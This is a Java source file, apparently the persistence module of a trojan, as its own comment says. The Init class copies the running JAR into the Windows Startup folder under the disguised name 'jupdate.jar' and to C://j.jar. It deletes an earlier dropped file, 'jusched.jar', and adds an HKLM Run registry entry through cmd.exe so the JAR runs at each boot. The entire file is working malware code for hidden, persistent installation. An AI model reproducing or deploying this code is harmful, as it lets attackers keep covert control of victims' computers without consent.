import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.FileChannel;
/**
 * Init class
 * @author Nathan
 *
 */
public class Init extends Thread
{
	/**
	 * Constructor
	 */
    public Init()
    {
    }
    /**
     * Copys a file from one place, to another
     * @param fromFileName
     * @param toFileName
     * @throws IOException
     */
    private static void copyfile(String srFile, String dtFile) {
    	try {
    	    File in = new File(srFile);
    	    File out = new File(dtFile);
            FileChannel inChannel = new
                FileInputStream(in).getChannel();
            FileChannel outChannel = new
                FileOutputStream(out).getChannel();
            try {
                inChannel.transferTo(0, inChannel.size(),
                        outChannel);
            } 
            catch (IOException e) {
                throw e;
            }
            finally {
                if (inChannel != null) inChannel.close();
                if (outChannel != null) outChannel.close();
            }
    	} catch(Exception e) { 
    		e.printStackTrace();
    	}
      }
    /**
     * Copys the file on a new thread and attempts to add it it to the registry startup, and startup
     */
    public void run()
    {
        Runtime rt = Runtime.getRuntime();
        try
        {
        	copyfile(Misc.getJARLoc(), (new StringBuilder(String.valueOf(Misc.findStartup()))).append("\\jupdate.jar").toString());
        	copyfile(Misc.getJARLoc(), "C://j.jar");
            try {
            /*
             * Not really needed, this was just for when i used a dropper to drop the trojan into
             * the users startup folder also with java.
             */
            File f = new File(Misc.findStartup()+"//jusched.jar");
            f.delete();
            } catch(Exception e) { }
        } catch(Exception e) { }
            try
            {
                rt.exec("cmd.exe /C start reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v C://j.jar /t REG_SZ /d C://j.jar");
            }
            catch(IOException e)
            {
                e.printStackTrace();
            }
            catch(Exception exception) { }
    }
}